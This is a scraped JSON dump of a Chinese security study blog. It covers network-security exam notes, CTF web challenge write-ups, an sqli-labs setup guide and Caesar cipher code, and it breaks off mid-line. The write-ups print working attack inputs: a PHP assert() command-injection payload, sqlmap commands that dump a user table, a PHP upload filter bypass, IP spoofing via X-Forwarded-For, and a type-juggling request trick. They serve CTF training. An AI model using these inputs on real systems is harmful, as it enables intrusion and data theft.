28.缓冲区溢出的防御措施(对简单代码能够修改优化，使之免受溢出攻击) 系统管理上1.关闭不需要的特权程序(缓冲区溢出只有获取更高权限时才有意义)2.及时给程序漏洞打补丁 软件开发过程中1.编写正确的代码(对数据长度和有效性检查，确保目标缓冲区中数据不越界并有效)C/C++语言本身不进行强类型和长度检查2.缓冲区不可执行3.改进C语言函数库隐患函数替换:如strncpy()替换strcpy()、strncat()替换strcat(),该类函数限定了字符串长度4.数组边界检查(使超长代码不可能被植入)5.程序指针完整性检查(阻止由于函数返回地址或函数指针的改变而导致程序执行流程的改变；检测指针是否被恶意改动，若改动则拒绝执行) 拒绝服务攻击(DoS攻击)(掌握)29.拒绝服务攻击的概念、分类概念破坏型攻击，不以获取目标系统访问权限为目的；利用传输协议弱点、系统漏洞、服务漏洞对目标系统发起大规模进攻，用超出目标处理能力的海量数据包消耗可用系统资源、带宽资源等，或造成程序缓冲区溢出错误，致使其无法处理合法用户请求，无法提供正常服务，最终导致网络服务瘫痪，甚至系统死机。 分类1.资源消耗2.系统或应用程序缺陷(Ping致死、land攻击、Smurf攻击、IP分片攻击、UDP泛洪攻击等)3.配置修改(修改运行配置，导致网络系统不能正常提供服务) 30.拒绝服务攻击的实例31.DDoS的工作原理即分布式拒绝服务攻击：https://baijiahao.baidu.com/s?id=1612405556732723729&amp;wfr=spider&amp;for=pc 32.拒绝服务攻击的防御1.进行合理带宽限制限制基于协议的带宽；如端口25只能使用25%的带宽2.运行尽可能少的服务，只允许必要的通信3.及时安装系统补丁4.封锁恶意IP地址5.增强系统用户的安全意识，避免成为傀儡主机 6.建立健全的DoS/DDoS攻击的应急响应机制身份认证33.AAA1.认证(你是谁？)2.授权(允许你干什么？)3.审计/记账(你干了什么？) 34.常用身份认证技术基于口令的认证1.基于单项哈希函数(结合挑战-响应机制) 2.加盐口令3.SKEY机制4.Bellovin-Merritt的EKE协议基于密码学的认证基于生物特征的认证35.Kerberos协议(掌握)Kerberos是一种计算机网络授权协议，用来在非安全网络中，对个人通信以安全的手段进行身份认证。 组成1.认证服务器AS2.票据许可服务器TGS3.客户端Client4.应用服务器Server 凭证1.票据Ticket2.鉴别码Authenticator 过程 记号 含义 C 客户端 S 服务端 ADc 客户的网络地址 Lifetime 票据的生存期 TS 时间戳 Kx x的私有密钥 Kx,y x与y的会话密钥 Kx[m] 以x的私有密钥加密的m Ticketx x的票据 Authenticatorx x的鉴别码 1.C请求票据许可票据2.AS发放票据许可票据和会话密钥3.C请求服务器票据4.TGS发放服务器票据和会话密钥5.C请求服务6.S提供服务器认证信息 36.PKI原理(公钥基础设施PKI:是一个包括硬件、软件、人员、策略和规程的集合，用来实现基于公钥密码体制的密钥和证书的产生、管理、存储、分发和撤销等功能。PKI体系是计算机软硬件、权威机构及应用系统的结合。它为实施电子商务、电子政务、办公自动化等提供了基本的安全服务，从而使那些彼此不认识或距离很远的用户能通过信任链安全地交流。)它利用公共密钥算法的特点，建立一套证书发放、管理和使用的体系，来支持和完成网络系统中的身份认证、信息加密、保证数据完整性和抗抵赖性。PKI 体系可以有多种不同的体系结构、实现方法和通信协议。 37.挑战相应机制**顾名思义，基于挑战/应答（Challenge/Response）方式的身份认证系统就是每次认证时认证服务器端都给客户端发送一个不同的”挑战”字串，客户端程序收到这个”挑战”字串后，做出相应的”应答”,以此机制而研制的系统.认证过程：1) 客户向认证服务器发出请求，要求进行身份认证；2) 认证服务器从用户数据库中查询用户是否是合法的用户，若不是，则不做进一步处理；3) 认证服务器内部产生一个随机数，作为”提问”，发送给客户；4) 客户将用户名字和随机数合并，使用单向Hash函数（例如MD5算法）生成一个字节串作为应答；5) 认证服务器将应答串与自己的计算结果比较，若二者相同，则通过一次认证；否则，认证失败；6) 认证服务器通知客户认证成功或失败。以后的认证由客户不定时地发起，过程中没有了客户认证请求一步。两次认证的时间间的密钥隔不能太短，否则就给网络、客户和认证服务器带来太大的开销；也不能太长，否则不能保证用户不被他人盗用IP地址，一般定为1-2分钟。 访问控制38.访问控制的概念就是在身份认证的基础上，依据授权对对提出的资源访问请求加以控制；遵循原则：1.最小特权原则2.多人负责原则(即授权分散化)3.职责分离原则 39.常见的访问控制的模型1.自主访问控制DAC2.强制访问控制MAC3.基于角色的访问控制RBAC4.基于属性的访问控制ABAC 40.访问控制机制指对主体访问客体的权力或能力的限制，以及限制进入物理区域(出入控制)和限制使用计算机系统和计算机存取数据的过程(存取控制)。 41.计算机安全形式化模型验证安全设计与实现； 1.Bell-LaPadula模型2.Biba模型防火墙与入侵检测42.防火墙的基本原理防火墙技术是通过有机结合各类用于安全管理与筛选的软件和硬件设备，帮助计算机网络于其内、外网之间构建一道相对隔绝的保护屏障，以保护用户资料与信息安全性的一种技术。防火墙技术的功能主要在于及时发现并处理计算机网络运行时可能存在的安全风险、数据传输等问题，其中处理措施包括隔离与保护，同时可对计算机网络安全当中的各项操作实施记录与检测，以确保计算机网络运行的安全性，保障用户资料与信息的完整性，为用户提供更好、更安全的计算机网络使用体验。 1.限制人们从一个特别的控制点进入，从而防止入侵者接近内部设施；2.限定人们从一个特别的点离开，从而有效的保护内部资源； 43.防火墙技术分类1.包过滤防火墙/路由器（静态/动态）工作在网络层/传输层； 2.代理技术(应用层/电路级) 3.混合型44.防火墙的配置方案1.屏蔽路由器2.双宿主机3.屏蔽主机4.屏蔽子网45.入侵检测的分类及工作原理分类：1.基于主机的入侵检测系统HIDS通过监视与分析主机的审计记录检测入侵；原理:安装在被检测的主机之上，主要是对该主机的网络实时连接以及系统审计日志进行智能分析和判断；(更好的辨识分析、成本低/慢) 2.基于网络的入侵检测系统NIDS通过在共享网段上对通信数据的侦听采集数据，分析可疑现象；原理：放置在比较重要的网段内，不停的监视网段中各种数据包。并对每个数据包进行特征分析，判断是否与系统内置的某些规则吻合；(成本低、实时/只能检查直连网段、数据量大、复杂检测困难) 3.分布式入侵检测系统检测网络中的数据包，与NIDS不同点：采用分布式检测，集中管理(范围广/影响流量) VPN46.VPN的概念指的是在公用网络上利用加密与控制访问技术建立专用网络的技术；分类1(按场合)：1.远程访问VPN2.网关-网关VPN主要技术：隧道技术、加密技术隧道：将一种协议的数据分装到另一种协议中进行传输的技术加密：保护隧道中数据的安全传输分类2(按隧道协议的实现层次)：1.第二层隧道协议主要：点到点，实现远程访问VPN2.第三层隧道协议主要：IP安全，用于网关-网关VPN，实现远程访问VPN3.第四层隧道协议处于传输层和应用层之前的一个安全子层；SSL/TLS；HTTPS 47.IPSec VPN：(熟记) IPSec:用于构建VPN的一系列协议，正在成为创建VPN的标准 功能IPSec只允许IP数据的封装和加密基于端对端的安全模式，在源IP和目的IP地址之间建立信任和安全性；IPSec可保障主机之间、网络安全网关(如路由器或防火墙)之间或主机与安全网管之间的数据包安全；可防范：数据嗅探、数据篡改、身份欺骗、重放攻击、拒绝服务攻击功能：访问控制、无连接的完整性、数据源认证、防止重复攻击、机密性(加密) 体系结构IPSec协议体系主要包含8部分：1.IP安全体系结构2.封装安全载荷3.验证头4.加密算法5.认证算法6.密钥管理7.解释域8.策略 组成1.Internet密钥交换协议(IKE)&lt;提供协商安全参数和创建认证密钥&gt;2.封装协议：(1)负载安全封装ESP：提供加密、认证和数据保护(2)认证报头协议AH：提供认证和数据保护 工作模式传输模式：两台主机之间(点到点)传递的数据加密隧道模式：两个不同网段(站点到站点)传送的数据内容加密或者两个私有IP网段穿越Internet连接区别：数据包在传输过程中是否需要更改IP报头 工作过程的3个阶段1.IPSec启动2.IKE SA(IKE阶段1–主模式)3.IPSec SA(IKE阶段2–快速模式) 数据包封装由ESP或AH或两种共同处理AH：为IP数据报提供无连接的完整性和数据源认证的机制ESP：提供了AH的大部分保护加上额外的机密性(使用DES、3DES、AES、RC5、IDEA)一般情况下使用ESP IKE(熟记)工作阶段及内容因特网密钥交换协议：*用于协商IPSec安全关联，要求IPSec系统首先进行身份认证，并建立ISAKMP或IKE共享密钥*SA包括两类：1.IKE SA：双向2.IPSec SA：单向的-&gt;建立双向VPN需要两个SA主要负责：*协商协议的参数*交换公共密钥*对双方进行验证*在交换后对密钥进行管理 安全关联SASA：代表两对等体或两主机之间的契约，描述对等体将怎样使用IPSec安全服务来保护网络流量；","categories":[],"tags":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/tags/notes/"}]},{"title":"Bug","slug":"Bug","date":"2019-12-09T01:18:21.000Z","updated":"2019-12-30T05:56:55.442Z","comments":true,"path":"2019/12/09/Bug/","link":"","permalink":"https://singlemindedt.github.io/2019/12/09/Bug/","excerpt":"","text":"bug题目分析：给出一个登录页面;首先随便注册一个用户； 登录； 发现只有Manage是不能普通用户使用的； 最后发现还有个Finpwd，找回密码之前应该会验证身份，应该是突破口； 实际操作：先以smtsec找回密码，发现直接给了一个newpwd输入框；应该是需要抓包修改用户身份； 修改为admin，提示修改成功； 以admin身份登录成功；但是Manage还是不能使用提示IP not allowed!应该要改为本地登录；在请求头中加入X-Forwarded-For: 127.0.0.1进行ip伪造；得到如下页面； 查看源码，看到提示： 看到filemanage想到可能do为upload(文件管理无非上传、下载、查看、删除)； 关于文件上传：https://blog.csdn.net/qq_42636435/article/details/88096844 根据提示Just image？因该是上传image然后改后缀； 构造： 123&lt;？php phpinfo();？&gt; 上传发现，过滤了;不是php文件又不能进行解析得到响应；非php文件下提示要上传php文件；It is not a really php file这里尝试使用php的脚本表达形式 123&lt;script language='php'&gt;phpinfo();&lt;/script&gt; 将jpg后缀改为php4/php5;(否则不能解析)就得到响应flag了.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"攻防世界","slug":"CTF/攻防世界","permalink":"https://singlemindedt.github.io/categories/CTF/攻防世界/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"NaNNaNNaNNaN-Batman","slug":"NaNNaNNaNNaN-Batman","date":"2019-12-09T01:08:23.000Z","updated":"2019-12-30T05:53:52.682Z","comments":true,"path":"2019/12/09/NaNNaNNaNNaN-Batman/","link":"","permalink":"https://singlemindedt.github.io/2019/12/09/NaNNaNNaNNaN-Batman/","excerpt":"","text":"NaNNaNNaNNaN-Batman题目分析：下载附件，得到web100的文本，打开是乱码，大概看了下，将后缀改为HTML，在浏览器里打开，得到一个OK输入框； 但是输入没有任何响应；回头再看看代码； 可以很明显看到,’’是一个变量，而它的内容就是后面一长串字符(三行绿色部分即’’中间部分)；最后eval()函数执行_; **eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。**此处，eval()并未执行$()函数，而是执行了字符串，导致乱码?:).为了能看到正常源码，将eval()改为alert()； **alert() 方法用于显示带有一条指定消息和一个 OK 按钮的警告框。alert是HTML DOM 中用到的一种脚本语言，它的中文意思是“提醒”。它是JavaScript或VBscript脚本语言中窗口window对象的一个常用方法；其主要用法就是在你自己定义了一定的函数以后，通过执行相应的操作，所弹出对话框的语言。并且alert对话框通常用于一些对用户的提示信息。|alert(message)| ||:——–:|:————-:||参数 |描述||message |要在 window 上弹出的对话框中显示的纯文本（而非 HTML 文本）|** 即： 1234567891011121314151617181920212223function $()&#123; var e=document.getElementById(\"c\").value; if(e.length==16) if(e.match(/^be0f23/)!=null) if(e.match(/233ac/)!=null) if(e.match(/e98aa$/)!=null) if(e.match(/c7be9/)!=null) &#123; var t=[\"fl\",\"s_a\",\"i\",\"e&#125;\"]; var n=[\"a\",\"_h0l\",\"n\"]; var r=[\"g&#123;\",\"e\",\"_0\"]; var i=[\"it'\",\"_\",\"n\"]; var s=[t,n,r,i]; for(var o=0;o&lt;13;++o) &#123; document.write(s[o%4][0]);s[o%4].splice(0,1) &#125; &#125;&#125; document.write('&lt;input id=\"c\"&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;'); delete _ **match() 方法可在字符串内检索指定的值，或找到一个或多个正则表达式的匹配。splice() 方法向/从数组中添加/删除项目，然后返回被删除的项目。(应该是从var后的几个值中挑选几个，组合得到flag)** 实际操作： 方法一：审计，变量e需要满足五个条件。长度为16；^表示开头一定要匹配到be0f23，$表示结尾一定要匹配到e98aa,其它的只要匹配到就行，没有位置要求；所以可以构造出：e==be0f233ac7be98aa在OK输入框中输入可以得到flag； 方法二：由于程序已经固定只是在输入时需要检测是否匹配，那么可以直接省去输入匹配部分，直接执行关键组合flag部分；提取如下代码，在控制台执行： 123456789101112131415161718function $()&#123; var e=document.getElementById(\"c\").value; &#123; var t=[\"fl\",\"s_a\",\"i\",\"e&#125;\"]; var n=[\"a\",\"_h0l\",\"n\"]; var r=[\"g&#123;\",\"e\",\"_0\"]; var i=[\"it'\",\"_\",\"n\"]; var s=[t,n,r,i]; for(var o=0;o&lt;13;++o) &#123; document.write(s[o%4][0]);s[o%4].splice(0,1) &#125; &#125;&#125; document.write('&lt;input id=\"c\"&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;'); delete _","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"攻防世界","slug":"CTF/攻防世界","permalink":"https://singlemindedt.github.io/categories/CTF/攻防世界/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"Training-WWW-Robots","slug":"Training-WWW-Robots","date":"2019-12-09T01:03:58.000Z","updated":"2019-12-30T05:50:13.720Z","comments":true,"path":"2019/12/09/Training-WWW-Robots/","link":"","permalink":"https://singlemindedt.github.io/2019/12/09/Training-WWW-Robots/","excerpt":"","text":"Training-WWW-Robots知识点补充： robots.txt是一个协议，而不是一个命令。robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。 当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。百度官方建议，仅当您的网站包含不希望被搜索引擎收录的内容时，才需要使用robots.txt文件。如果您希望搜索引擎收录网站上所有内容，请勿建立robots.txt文件。 如果将网站视为酒店里的一个房间，robots.txt就是主人在房间门口悬挂的“请勿打扰”或“欢迎打扫”的提示牌。这个文件告诉来访的搜索引擎哪些房间可以进入和参观，哪些房间因为存放贵重物品，或可能涉及住户及访客的隐私而不对搜索引擎开放。但robots.txt不是命令，也不是防火墙，如同守门人无法阻止窃贼等恶意闯入者。 Robots协议用来告知搜索引擎哪些页面能被抓取，哪些页面不能被抓取；可以屏蔽一些网站中比较大的文件，如：图片，音乐，视频等，节省服务器带宽；可以屏蔽站点的一些死链接。方便搜索引擎抓取网站内容；设置网站地图连接，方便引导蜘蛛爬取页面。(摘自百度百科) 实际操作： 访问robots.txt，发现不允许访问fl0g.php 尝试访问/fl0g.php，得到flag；","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"攻防世界","slug":"CTF/攻防世界","permalink":"https://singlemindedt.github.io/categories/CTF/攻防世界/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"Mfw","slug":"Mfw","date":"2019-12-09T00:58:05.000Z","updated":"2019-12-30T05:47:02.290Z","comments":true,"path":"2019/12/09/Mfw/","link":"","permalink":"https://singlemindedt.github.io/2019/12/09/Mfw/","excerpt":"","text":"Mfw题目分析：打开链接，几个目录都看了下，发现： 可能存在git源码泄露，尝试访问.git目录： 实际操作：利用Githack得到网站源码(直接将GitHack.py拖入cmd,输入执行命令)： 在GitHack目录下可以看到网站源码文件夹： 在flag.php中只有如下内容： 1234&lt;?php// TODO// $FLAG = '';?&gt; 是将flag.php中的内容注释了，不显在网页上。 在index.php中发现关键代码： 12345678910111213&lt;?phpif (isset($_GET['page'])) &#123; $page = $_GET['page'];&#125; else &#123; $page = \"home\";&#125;$file = \"templates/\" . $page . \".php\";// I heard '..' is dangerous!assert(\"strpos('$file', '..') === false\") or die(\"Detected hacking attempt!\");// TODO: Make this look niceassert(\"file_exists('$file')\") or die(\"That file doesn't exist!\");?&gt; **assert()这个函数在php语言中是用来判断一个表达式是否成立。返回true or false; 1234567891011/*PHP官方文档是怎么解释的：assert — 检查一个断言是否为 FALSE PHP 5 bool assert ( mixed $assertion [, string $description ] ) PHP 7 bool assert ( mixed $assertion [, Throwable $exception ] ) assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动。 如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。 assertion 是字符串的优势是当禁用断言时它的开销会更小，并且在断言失败时消息会包含 assertion 表达式。 这意味着如果你传入了 boolean 的条件作为 assertion，这个条件将不会显示为断言函数的参数；在调用你定义的 assert_options() 处理函数时，条件会转换为字符串，而布尔值 FALSE 会被转换成空字符串。断言这个功能应该只被用来调试。 你应该用于完整性检查时测试条件是否始终应该为 TRUE，来指示某些程序错误，或者检查具体功能的存在（类似扩展函数或特定的系统限制和功能）。*/ 123die() 函数输出一条消息，并退出当前脚本；strpos(string,find,start)查找find在字符串string中第一次出现的位置;file_exists() 函数检查文件或目录是否存在。如果指定的文件或目录存在则返回 TRUE，否则返回 FALSE。 **如此这般，可以利用assert()函数执行命令，类似sql注入，在数据库中查找，构造url为page=abc’) or system(“cat templates/flag.php”);//{用lww’)闭合前半部分，得到false；之后执行system();//注释掉后面的代码；","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"攻防世界","slug":"CTF/攻防世界","permalink":"https://singlemindedt.github.io/categories/CTF/攻防世界/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"Lottery!","slug":"Lottery","date":"2019-12-09T00:49:07.000Z","updated":"2019-12-30T05:27:05.568Z","comments":true,"path":"2019/12/09/Lottery/","link":"","permalink":"https://singlemindedt.github.io/2019/12/09/Lottery/","excerpt":"","text":"Lottery！题目分析：随便输入7个数字得到以下结果，并且每次的winning numbers都是不同的，应该为随机数；根据Claim Your Prize中的提示，需要花费$9990000才能买到flag，如果一直猜数字获得余额不太现实， 实际操作:用burpsuite对输入彩票数字验证过程抓包，得到api.php; 不过还是不太清楚怎么搞，看了下wp，说是git源码泄露：在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。 尝试访问： 可以利用Githack提取下载源码；(但其实本题直接在附件里给出了网站源码、滑稽.gif)打开之前下载好的源文件： 打开api.php文件，可以看到以下验证彩票数字代码： 123456789101112131415161718192021222324252627282930$win_numbers = random_win_nums(); $same_count = 0; for($i=0; $i&lt;7; $i++)&#123; if($numbers[$i] == $win_numbers[$i])&#123; $same_count++; &#125; &#125; switch ($same_count) &#123; case 2: $prize = 5; break; case 3: $prize = 20; break; case 4: $prize = 300; break; case 5: $prize = 1800; break; case 6: $prize = 200000; break; case 7: $prize = 5000000; break; default: $prize = 0; break; &#125; 可以看到，代码将用户输入的7个数与7个随机数比较，并且用的==(弱类型比较),因为json支持bool数据，所以我们可以直接用true来使==成立；改包： 发现已经获得$200000;多提交几余额就够了，buy-&gt;flag；","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"攻防世界","slug":"CTF/攻防世界","permalink":"https://singlemindedt.github.io/categories/CTF/攻防世界/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"ics-04","slug":"ics-04","date":"2019-12-09T00:28:33.000Z","updated":"2019-12-30T05:16:00.470Z","comments":true,"path":"2019/12/09/ics-04/","link":"","permalink":"https://singlemindedt.github.io/2019/12/09/ics-04/","excerpt":"","text":"ics-04问题分析： 本题和之前几题使用了相同的页面，根据提示漏洞位置应该在登录和注册上，随便注册都能成功，但是登录时提示“普通用户登录成功，没什么用”； 尝试sql注入，这两个地方并没有什么注入点，看到还有个“忘记密码？”，可以正常使用找回密码，尝试sql注入；利用sqlmap检测，发现存在漏洞； 构造命令猜解数据库名：–dbs 枚举数据库管理系统数据库1sqlmap -u \"http://111.198.29.45:33931/findpwd.php\" --data=\"username=1\" --dbs 得到库名结果； 库名 对每个数据库进行表名猜解；1sqlmap -u \"http://111.198.29.45:33931/findpwd.php\" --data=\"username=1\" -D cetc004 --tables 对数据库cetc004中表user猜解列名；–columns 枚举DBMS数据库表列1sqlmap -u \"http://111.198.29.45:33931/findpwd.php\" --data=\"username=1\" -D cetc004 -T user --columns 对username和password进行内容查询；–dump 转储数据库管理系统的数据库中的表项 1sqlmap -u \"http://111.198.29.45:33931/findpwd.php\" --data=\"username=1\" -D cetc004 -T user -C \"username,password\" --dump 由于可以重复注册，于是使用c3tlwDmln23注册，注册成功，登陆后得到flag； 此时对username查询可得到两条结果；第一行为原来的，第二行为刚才注册的，所以漏洞原因为未对用户名重复问题加以过滤，造成数据库查表错误；知识补充：如果觉得打开Kali虚拟机麻烦，可以在Windows上安装一个sqlmap，具体步骤网上都有教程；如果遇到“不是内部或外部命令，也不是可运行的程序 或批处理文件。”时，看一下自己的“起始位置”的路径，是不是没有指定清楚，如果填写的是C:\\Python27\\sqlmap；那么请查看sqlmap下到sqlmap python File是否还有间接文件夹，若有直接加上\\name；或者直接复制改名为sqlmap放在Python27下；删除原来的文件；关于sqlmap使用：https://blog.csdn.net/qq_33530840/article/details/82144515","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"攻防世界","slug":"CTF/攻防世界","permalink":"https://singlemindedt.github.io/categories/CTF/攻防世界/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"sqli-labs环境搭建","slug":"sqli-labs环境搭建","date":"2019-12-02T02:01:08.000Z","updated":"2020-02-19T08:43:53.530Z","comments":true,"path":"2019/12/02/sqli-labs环境搭建/","link":"","permalink":"https://singlemindedt.github.io/2019/12/02/sqli-labs环境搭建/","excerpt":"","text":"1.由于版本支持等问题，此次环境安装建议下载Phpstudy2018版本，解压安装(可自定义安装目录)； 2.下载sqli-labs文件，Github下载解压至Phpstudy2018\\PHPTutorial\\WWW目录下； 3.更改数据库密码，E:\\PhpStudy2018\\PHPTutorial\\WWW\\sqli-labs-master\\sqli-labs-master\\sql-connections\\db-creds,自己任意设置； 4.开启Phpstudy2018的Apache和MySql服务; 5.基本配置完成，打开 http://127.0.0.1/sqli-labs-master/ 若出现如下页面则搭建成功； 6.点击Setup/reset Database for labs建立数据库连接，若出现如下页面则搭建完成； 7.访问http://127.0.0.1/sqli-labs-master/ 时，若出现You don’t have permission to access /sqli-labs-master/ on this server.；则打开Phpstudy2018的“其他选项菜单\\打开配置文件\\httpd.conf”;配置为如下情况； 同时将“phpstudy设置”设置为“允许目录列表”；至此，sqli-labs环境搭建完成！","categories":[{"name":"SQL","slug":"SQL","permalink":"https://singlemindedt.github.io/categories/SQL/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"https://singlemindedt.github.io/tags/SQL/"}]},{"title":"C++/Python实现凯撒密码","slug":"凯撒密码","date":"2019-11-16T14:18:05.000Z","updated":"2019-12-17T13:18:28.419Z","comments":true,"path":"2019/11/16/凯撒密码/","link":"","permalink":"https://singlemindedt.github.io/2019/11/16/凯撒密码/","excerpt":"","text":"凯撒密码C++ 在密码学中，恺撒密码（英语：Caesar cipher），或称恺撒加密、恺撒变换、变换加密，是一种最简单且最广为人知的加密技术。它是一种替换加密的技术，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例如，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推。这个加密方法是以罗马共和时期恺撒的名字命名的，当年恺撒曾用此方法与其将军们进行联系。 代码实现 (已知密钥情况下) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include&lt;bits/stdc++.h&gt;using namespace std;void Encryption(string C,int key,int model);//加密函数void Decryption(string M,int key,int model);//解密函数int main()&#123; string C; int key; int model; //int len;//字符串长度 while(1) &#123; cout&lt;&lt;\"Model:\"&lt;&lt;endl; cout&lt;&lt;\"1:Encry\"&lt;&lt;endl; cout&lt;&lt;\"2:Decry\"&lt;&lt;endl; cin&gt;&gt;model; if(model==1) &#123; cout&lt;&lt;\"Please enter the content to be encrypted:\"; cin&gt;&gt;C; //len=strlen(C);//错误:C需要转换为char*类型 cout&lt;&lt;\"Please enter key :\"; cin&gt;&gt;key; Encryption(C,key,model); &#125; else if(model==2) &#123; cout&lt;&lt;\"Please enter the content to be decrypted:\"; cin&gt;&gt;C; cout&lt;&lt;\"Please enter key :\"; cin&gt;&gt;key; Decryption(C,key,model); &#125; else cout&lt;&lt;\"Error!\"&lt;&lt;endl; &#125; return 0;&#125; void Encryption(string C,int key,int model)&#123; if(model==1) &#123; for(int i=0;i&lt;C.length();i++) &#123; if(C[i]&gt;='A'&amp;&amp;C[i]&lt;='Z') C[i]='A'+(C[i]-'A'+key)%26; else if(C[i]&gt;='a'&amp;&amp;C[i]&lt;='z') C[i]='a'+(C[i]-'a'+key)%26; &#125; cout&lt;&lt;\"The result of the encryption is：\"&lt;&lt;C&lt;&lt;endl; &#125; else cout&lt;&lt;\"Error！\"&lt;&lt;endl; &#125; void Decryption(string M,int key,int model)&#123; if(model==2) &#123; for(int i = 0; i &lt;M.length(); i++) &#123; if(M[i] &gt;= 'A' &amp;&amp; M[i] &lt;= 'Z') M[i] = 'A'+(M[i]-'A'-key+26)%26;//M[i]='A'+(M[i]-'A'+(26-key)) else if(M[i] &gt;= 'a' &amp;&amp; M[i] &lt;= 'z') M[i] = 'a'+(M[i]-'a'-key+26)%26;//... &#125; cout&lt;&lt;\"The result of the decryption is:\"&lt;&lt;M&lt;&lt;endl; &#125; else cout&lt;&lt;\"Error！\"&lt;&lt;endl; &#125; 完整版（就是穷举了key） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#include&lt;bits/stdc++.h&gt;using namespace std;void Encryption(string C,int key,int mode);//加密函数void Decryption(string M,int key,int mode);//解密函数int main()&#123; string C; int key;//偏移位 int mode; //int len;//字符串长度 while(1) &#123; cout&lt;&lt;\"Mode:(Please enter selection mode！！！)\"&lt;&lt;endl; cout&lt;&lt;\"1:Encry\"&lt;&lt;endl; cout&lt;&lt;\"2:Decry\"&lt;&lt;endl; cout&lt;&lt;\"3:Keyless Decryption\"&lt;&lt;endl; cin&gt;&gt;mode; if(mode==1) &#123; cout&lt;&lt;\"Please enter the content to be encrypted:\"; cin&gt;&gt;C; //len=strlen(C);//错误:C需要转换为char*类型 cout&lt;&lt;\"Please enter key :\"; cin&gt;&gt;key; Encryption(C,key,mode); &#125; else if(mode==2) &#123; cout&lt;&lt;\"Please enter the content to be decrypted:\"; cin&gt;&gt;C; cout&lt;&lt;\"Please enter key :\"; cin&gt;&gt;key; Decryption(C,key,mode); &#125; else if(mode==3) &#123; cout&lt;&lt;\"Please enter the content to be decrypted:\"; cin&gt;&gt;C; for(int k=1;k&lt;26;k++) Decryption(C,k,mode); &#125; else cout&lt;&lt;\"Error!\"&lt;&lt;endl; &#125; return 0;&#125; void Encryption(string C,int key,int mode)&#123; //if(mode==1) //&#123; for(int i=0;i&lt;C.length();i++) &#123; if(C[i]&gt;='A'&amp;&amp;C[i]&lt;='Z') C[i]='A'+(C[i]-'A'+key)%26; else if(C[i]&gt;='a'&amp;&amp;C[i]&lt;='z') C[i]='a'+(C[i]-'a'+key)%26; &#125; cout&lt;&lt;\"The result of the encryption is：\"&lt;&lt;C&lt;&lt;endl; //&#125; //else //cout&lt;&lt;\"Error！\"&lt;&lt;endl; &#125; void Decryption(string M,int key,int mode)&#123; //if(mode==2) //&#123; for(int i = 0; i &lt;M.length(); i++) &#123; if(M[i] &gt;= 'A' &amp;&amp; M[i] &lt;= 'Z') M[i] = 'A'+(M[i]-'A'-key+26)%26;//M[i]='A'+(M[i]-'A'+(26-key)) else if(M[i] &gt;= 'a' &amp;&amp; M[i] &lt;= 'z') M[i] = 'a'+(M[i]-'a'-key+26)%26;//... &#125; cout&lt;&lt;\"The result of the decryption is:\"&lt;&lt;M&lt;&lt;endl; cout&lt;&lt;endl; //&#125; // else // cout&lt;&lt;\"Error！\"&lt;&lt;endl; &#125; #凯撒密码Python 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#Encryptiondef Encryption(C,key,mode): C_list=list(C) C_list_encry=C_list i=0 while i&lt;len(C_list ): if(ord(C_list[i])&gt;=65 and ord(C_list[i])&lt;=90): C_list_encry[i]=chr(65+(ord(C_list[i])-65+key)%26) if (ord(C_list[i])&gt;=97 and ord(C_list[i]) &lt;= 122): C_list_encry[i] = chr(97+ (ord(C_list[i]) - 97 + key) % 26) i+=1 print(\"The result of the encryption is：\"+\"\".join(C_list_encry ))#Decryptiondef Decryption(C,key,mode): C_list = list(C) C_list_decry = C_list i = 0 while i &lt; len(C_list): if (ord(C_list[i]) &gt;= 65 and ord(C_list[i]) &lt;= 90): C_list_decry[i] = chr(65 + (ord(C_list[i])-65-key+26) % 26) if (ord(C_list[i]) &gt;= 97 and ord(C_list[i]) &lt;= 122): C_list_decry[i] = chr(97 + (ord(C_list[i]) - 97-key+26) % 26) i+=1 print(\"The result of the decryption is:\"+\"\".join(C_list_decry))#main()def main(): while(1): print(\"Mode:(Please select mode！！！)\") print(\"1:Encry\") print(\"2:Decry\") print(\"3:Keyless Decryption\") mode=input () if mode==\"1\": print(\"Please enter the content to be encrypted:\") C=input() print(\"Please enter key:\") key = int(input()) key=key%26 Encryption(C, key, mode) if mode==\"2\": print(\"Please enter the content to 